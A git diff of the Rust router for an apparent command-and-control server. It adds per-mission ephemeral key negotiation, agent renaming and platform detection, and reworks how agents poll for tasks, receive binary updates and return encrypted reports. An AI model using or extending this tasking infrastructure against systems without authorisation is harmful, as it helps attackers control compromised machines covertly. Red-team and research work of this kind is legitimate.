@@ -1,12 +1,12 @@
 use axum::{
-    extract::State,
+    extract::{Path, State},
     http::StatusCode,
     response::IntoResponse,
     routing::{get, post, put},
     Json, Router,
 };
-use common::{api, crypto};
-use tracing::debug;
+use common::{crypto, model};
+use tracing::{debug, error, warn};
 
 use crate::{services, C2State};
 
@@ -16,11 +16,15 @@ use crate::{services, C2State};
 
 pub fn init_router() -> Router<C2State> {
     Router::new()
+        .route("/crypto/:mission_id", get(get_crypto))
         .nest(
             "/agents",
-            Router::new()
-                .route("/", get(agents::get))
-                .route("/:agent_id/update", put(agents::update_bin)),
+            Router::new().route("/", get(agents::get)).nest(
+                "/:agent_id",
+                Router::new()
+                    .route("/update", put(agents::update_bin))
+                    .route("/name/:agent_name", put(agents::update_name)),
+            ),
         )
         .nest(
             "/missions",
@@ -31,6 +35,68 @@ pub fn init_router() -> Router<C2State> {
                     get(missions::get_report).put(missions::report),
                 ),
         )
+}
+
+const AGENT_NOT_FOUND: &str = "Agent not found.";
+const MISSION_NOT_FOUND: &str = "Mission not found.";
+
+async fn get_crypto(
+    State(mut c2_state): State<C2State>,
+    Path(mission_id): Path<i32>,
+    crypto_negociation: Json<model::CryptoNegociation>,
+) -> impl IntoResponse {
+    // Check agent & agent exists
+    let agent = match crypto_negociation.verify() {
+        Ok(_) => {
+            match services::agents::get_by_identity(
+                &c2_state.conn.lock().unwrap(),
+                crypto_negociation.identity.to_bytes(),
+            ) {
+                Some(agent) => agent,
+                None => {
+                    warn!("Agent not found");
+                    return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
+                }
+            }
+        }
+        Err(e) => {
+            error!("{e}");
+            return (StatusCode::UNAUTHORIZED).into_response();
+        }
+    };
+
+    // Check mission exists
+    let mission = match services::missions::get_by_id(&c2_state.conn.lock().unwrap(), mission_id) {
+        Ok(Some(m)) => m,
+        Ok(None) => {
+            warn!("Mission not found");
+            return (StatusCode::NOT_FOUND, MISSION_NOT_FOUND).into_response();
+        }
+        Err(e) => {
+            error!("{e}");
+            return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
+        }
+    };
+
+    // Check mission is not completed and is for the agent
+    if mission.completed_at.is_some() || mission.agent_id != agent.id {
+        warn!(
+            "Mission [{}] is completed or not affected to agent [{}]",
+            mission_id, agent.id
+        );
+        return (StatusCode::BAD_REQUEST).into_response();
+    }
+
+    let (private_key, crypto_negociation) =
+        model::CryptoNegociation::new(&mut c2_state.signing_key);
+    c2_state
+        .ephemeral_private_keys
+        .lock()
+        .unwrap()
+        .entry(mission.id)
+        .or_insert(private_key);
+
+    (StatusCode::OK, Json(Some(crypto_negociation))).into_response()
 }
 
 mod agents {
@@ -49,62 +115,64 @@ mod agents {
 
     // #[axum::debug_handler]
     pub async fn update_bin(
-        State(mut c2_state): State<C2State>,
+        State(c2_state): State<C2State>,
         Path(agent_id): Path<i32>,
         _bin: Bytes,
     ) -> impl IntoResponse {
         let mut conn = c2_state.conn.lock().unwrap();
-        // let Some(agent) = services::agents::get_by_id(&conn, agent_id) else {
-        //     return (StatusCode::NOT_FOUND).into_response();
-        // };
-        let (public_key, private_key, _) =
-            crypto::generate_key_exchange_key_pair(&mut c2_state.signing_key);
-        if let Err(e) = services::missions::create(
-            &mut conn,
-            agent_id,
-            api::Task::Update(vec![]),
-            (public_key, private_key),
-        ) {
+        if services::agents::get_by_id(&conn, agent_id).is_none() {
+            return (StatusCode::NOT_FOUND).into_response();
+        };
+        if let Err(e) = services::missions::create(&mut conn, agent_id, model::Task::Update(vec![]))
+        {
             error!("{e}");
             return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
         }
         (StatusCode::OK).into_response()
     }
+
+    pub async fn update_name(
+        State(c2_state): State<C2State>,
+        Path((agent_id, agent_name)): Path<(i32, String)>,
+    ) -> impl IntoResponse {
+        let conn = c2_state.conn.lock().unwrap();
+        let Ok(agent) = services::agents::update_name_by_id(&conn, agent_id, &agent_name) else {
+            return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
+        };
+        (StatusCode::OK, Json(Some(agent))).into_response()
+    }
 }
 
 mod missions {
-    use axum::extract::Path;
-    use common::api::Mission;
+    use std::str::FromStr;
+
+    use axum::{extract::Path, http::HeaderMap};
+    use common::{model::Mission, PLATFORM_HEADER};
     use tracing::error;
 
     use super::*;
 
-    pub async fn create(
-        State(mut c2_state): State<C2State>,
-        body: Json<Mission>,
-    ) -> impl IntoResponse {
+    pub async fn create(State(c2_state): State<C2State>, body: Json<Mission>) -> impl IntoResponse {
         debug!("{body:#?}");
-        let (public_key, private_key, _) =
-            crypto::generate_key_exchange_key_pair(&mut c2_state.signing_key);
         let mut conn = c2_state.conn.lock().unwrap();
-        let mission = services::missions::create(
-            &mut conn,
-            body.agent_id,
-            body.task.clone(),
-            (public_key, private_key),
-        );
-        if let Ok(mission) = mission {
+        if let Ok(mission) = services::missions::create(&mut conn, body.agent_id, body.task.clone())
+        {
             (StatusCode::CREATED, Json(mission)).into_response()
         } else {
             (StatusCode::INTERNAL_SERVER_ERROR).into_response()
         }
     }
 
+    // TODO Implement long polling
     pub async fn get_next(
         State(mut c2_state): State<C2State>,
-        crypto_negociation: Json<api::CryptoNegociation>,
+        headers: HeaderMap,
+        crypto_negociation: Json<model::CryptoNegociation>,
     ) -> impl IntoResponse {
-        crypto_negociation.verify().unwrap();
+        if let Err(e) = crypto_negociation.verify() {
+            error!("{e}");
+            return (StatusCode::UNAUTHORIZED).into_response();
+        }
 
         let mut conn = c2_state.conn.lock().unwrap();
 
@@ -113,26 +181,35 @@ mod missions {
         {
             agent
         } else {
-            services::agents::create(
+            match services::agents::create(
                 &conn,
                 "Unnamed agent",
                 crypto_negociation.identity.to_bytes(),
-            )
-            .unwrap()
+                headers
+                    .get(PLATFORM_HEADER)
+                    .and_then(|p| model::Platform::from_str(p.to_str().unwrap()).ok())
+                    .unwrap_or(model::Platform::Unix),
+            ) {
+                Ok(agent) => agent,
+                Err(e) => {
+                    error!("{e}");
+                    return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
+                }
+            }
         };
 
         if let Some(mission) = services::missions::get_next(&mut conn, agent.id) {
-            //
-            let mission = if let api::Mission {
-                task: api::Task::Update(_),
+            // TODO Fix that
+            let mission = if let model::Mission {
+                task: model::Task::Update(_),
                 ..
             } = mission
             {
                 // let agent_bin =
                 //     std::fs::read("target/x86_64-pc-windows-gnu/release/agent.exe").unwrap();
                 let agent_bin = std::fs::read("target/release/agent").unwrap();
-                api::Mission {
-                    task: api::Task::Update(agent_bin),
+                model::Mission {
+                    task: model::Task::Update(agent_bin),
                     ..mission
                 }
             } else {
@@ -145,7 +222,7 @@ mod missions {
             (
                 StatusCode::OK,
                 Json(Some(
-                    api::CryptoMessage::new(
+                    model::CryptoMessage::new(
                         &mut c2_state.signing_key,
                         crypto_negociation.public_key,
                         &mission,
@@ -153,9 +230,10 @@ mod missions {
                     .unwrap(),
                 )),
             )
+                .into_response()
         } else {
             debug!("No mission for agent {}", agent.id);
-            (StatusCode::NO_CONTENT, Json(None))
+            (StatusCode::NO_CONTENT).into_response()
         }
     }
 
@@ -164,10 +242,10 @@ mod missions {
         Path(mission_id): Path<i32>,
     ) -> impl IntoResponse {
         let conn = c2_state.conn.lock().unwrap();
-        let (mission, _) = match services::missions::get_by_id(&conn, mission_id) {
-            Ok(Some((m, k))) => (m, k),
+        let mission = match services::missions::get_by_id(&conn, mission_id) {
+            Ok(Some(m)) => m,
             Ok(None) => {
-                return (StatusCode::NOT_FOUND, "Mission not found.").into_response();
+                return (StatusCode::NOT_FOUND, MISSION_NOT_FOUND).into_response();
             }
             Err(e) => {
                 error!("{e}");
@@ -185,14 +263,14 @@ mod missions {
     pub async fn report(
         State(c2_state): State<C2State>,
         Path(mission_id): Path<i32>,
-        crypto_message: Json<api::CryptoMessage>,
+        crypto_message: Json<model::CryptoMessage>,
     ) -> impl IntoResponse {
         let mut conn = c2_state.conn.lock().unwrap();
 
-        let (mission, private_key) = match services::missions::get_by_id(&conn, mission_id) {
-            Ok(Some((m, k))) => (m, k),
+        let mission = match services::missions::get_by_id(&conn, mission_id) {
+            Ok(Some(m)) => m,
             Ok(None) => {
-                return (StatusCode::NOT_FOUND, "Mission not found.").into_response();
+                return (StatusCode::NOT_FOUND, MISSION_NOT_FOUND).into_response();
             }
             Err(e) => {
                 error!("{e}");
@@ -201,12 +279,25 @@ mod missions {
         };
 
         let Some(agent) = services::agents::get_by_id(&mut conn, mission.agent_id) else {
-            return (StatusCode::NOT_FOUND, "Agent not found.").into_response();
+            return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
         };
 
-        crypto_message
-            .verify(&crypto::VerifyingKey::from_bytes(&agent.identity).unwrap())
-            .unwrap();
+        if let Err(e) =
+            crypto_message.verify(&crypto::VerifyingKey::from_bytes(&agent.identity).unwrap())
+        {
+            error!("{e}");
+            return (StatusCode::UNAUTHORIZED).into_response();
+        }
+
+        let Some(private_key) = c2_state
+            .ephemeral_private_keys
+            .lock()
+            .unwrap()
+            .remove(&mission_id)
+        else {
+            warn!("No ephemeral private key for mission {}", mission_id);
+            return (StatusCode::UNAUTHORIZED).into_response();
+        };
         let decrypted_data = crypto_message.decrypt(private_key).unwrap();
 
         let result = String::from_utf8(decrypted_data).unwrap();
